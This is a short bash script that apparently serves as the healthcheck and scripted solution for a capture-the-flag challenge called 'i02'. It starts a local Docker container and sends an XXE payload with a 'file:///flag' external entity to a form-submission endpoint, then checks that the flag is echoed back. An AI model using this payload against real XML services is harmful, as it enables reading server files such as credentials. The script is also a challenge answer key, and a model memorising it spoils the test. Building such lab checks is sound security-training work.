#!/usr/bin/env bash
# i02 healthcheck / scripted solve: send an XXE payload that reads /flag via a
# file:// external entity and confirm the flag is reflected.
set -euo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
FLAG="${CHAL_FLAG-}"; [ -n "$FLAG" ] || FLAG='CYPHER{xxe_file_read_lankagov}'
TARGET="${TARGET-}"; CID=""
trap '[ -n "$CID" ] && docker rm -f "$CID" >/dev/null 2>&1 || true' EXIT

if [ -z "$TARGET" ]; then
  docker build -q -t cypher-i02 "$HERE" >/dev/null
  CID="$(docker run -d -e FLAG="$FLAG" -P cypher-i02)"
  PORT="$(docker port "$CID" 8000/tcp | head -1 | sed 's/.*://')"
  TARGET="http://127.0.0.1:$PORT"
fi
for i in $(seq 1 30); do curl -fsS "$TARGET/" >/dev/null 2>&1 && break; sleep 0.5; done

PAYLOAD='<?xml version="1.0"?>
<!DOCTYPE form [ <!ENTITY xxe SYSTEM "file:///flag"> ]>
<form><nic>&xxe;</nic><reason>renewal</reason></form>'
BODY="$(curl -fsS -X POST -H 'Content-Type: application/xml' --data-binary "$PAYLOAD" "$TARGET/api/forms/submit")"
echo "response: $BODY"
case "$BODY" in *"$FLAG"*) echo "i02 healthcheck rc=0"; exit 0 ;; esac
echo "i02 healthcheck FAILED"; exit 1
